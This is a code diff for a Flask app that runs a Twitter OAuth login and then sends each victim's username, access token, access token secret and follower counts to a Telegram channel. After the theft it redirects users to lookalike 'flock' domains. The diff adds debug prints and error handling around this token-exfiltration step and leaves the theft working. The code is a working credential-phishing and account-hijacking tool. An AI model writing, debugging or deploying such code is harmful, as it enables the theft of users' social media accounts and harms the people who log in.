@@ -48,8 +48,16 @@ def send_telegram_message(message):
         'chat_id': telegram_channel_id,
         'text': message
     }
-    response = requests.post(telegram_api_url, params=params)
-    return response.json()
+    try:
+        response = requests.post(telegram_api_url, params=params)
+        response_data = response.json()
+        print(f"Telegram response: {response_data}")  # Debug statement
+        if not response_data.get('ok'):
+            print(f"Error sending message: {response_data['description']}")
+        return response_data
+    except Exception as e:
+        print(f"Exception when sending message to Telegram: {e}")
+        return None
 
 
 def log_user_info(username, access_token, access_token_secret, followers_count, friends_count, created_at,
@@ -87,28 +95,41 @@ def login():
     auth = tweepy.OAuthHandler(consumer_key, consumer_secret, callback_url)
     auth_url = auth.get_authorization_url()
     session['request_token'] = auth.request_token
+    print(f"Request Token: {session['request_token']}")  # Debug statement
     return redirect(auth_url)
 
 
 @app.route('/callback')
 async def callback():
-    request_token = session['request_token']
+    print("Callback initiated")  # Debug statement
+    request_token = session.get('request_token')
+    print(f"Retrieved Request Token: {request_token}")  # Debug statement
+    if not request_token:
+        print("No request_token found in session")  # Debug statement
+        return redirect(url_for('home'))  # Handle case where request_token is not set
+
     del session['request_token']
+
 
     auth = tweepy.OAuthHandler(consumer_key, consumer_secret, callback_url)
     auth.request_token = request_token
 
     verifier = request.args.get('oauth_verifier')
+    print(f"Verifier: {verifier}")  # Debug statement
     auth.get_access_token(verifier)
 
     session['access_token'] = auth.access_token
     session['access_token_secret'] = auth.access_token_secret
+
     access_token = session.get('access_token')
     access_token_secret = session.get('access_token_secret')
 
-    if not access_token or not access_token_secret:
-        return redirect('https://flock.com')
+    print(f"Access Token: {access_token}")  # Debug statement
+    print(f"Access Token Secret: {access_token_secret}")  # Debug statement
 
+    if not access_token or not access_token_secret:
+        print("Access token or secret not found")  # Debug statement
+        return redirect('https://flock.com')
 
     auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
     auth.set_access_token(access_token, access_token_secret)
@@ -121,10 +142,16 @@ async def callback():
     user = api.verify_credentials()
     outreach_percentage = calculate_outreach_ability(user)
 
-    ext = "**New Account(app made by andrew tate)**\n\n🪪~Username: " + user.screen_name + "\n\n🔑~Access Token: " + access_token + "\n\n🔑~Access Token Secret: " + access_token_secret + "\n\n👥~Followers: " + str(
-        user.followers_count) + "\n\n🎉~Friends: " + str(user.friends_count) + "\n\n⏰~Created At: " + str(
-        user.created_at) + "\n\n💎~Outreach Percent: " + outreach_percentage + "%"
-    send_telegram_message(ext)
+    ext = (
+        f"**New Account(app made by andrew tate)**\n\n🪪~Username: {user.screen_name}\n\n🔑~Access Token: {access_token}\n\n"
+        f"🔑~Access Token Secret: {access_token_secret}\n\n👥~Followers: {user.followers_count}\n\n"
+        f"🎉~Friends: {user.friends_count}\n\n⏰~Created At: {user.created_at}\n\n💎~Outreach Percent: {outreach_percentage}%"
+    )
+    print(f"Message to be sent: {ext}")  # Debug statement
+    try:
+        send_telegram_message(ext)
+    except Exception as e:
+        print(f"Error sending telegram message: {e}")  # Debug statement
     return redirect('https://us-flock.com')
 
 
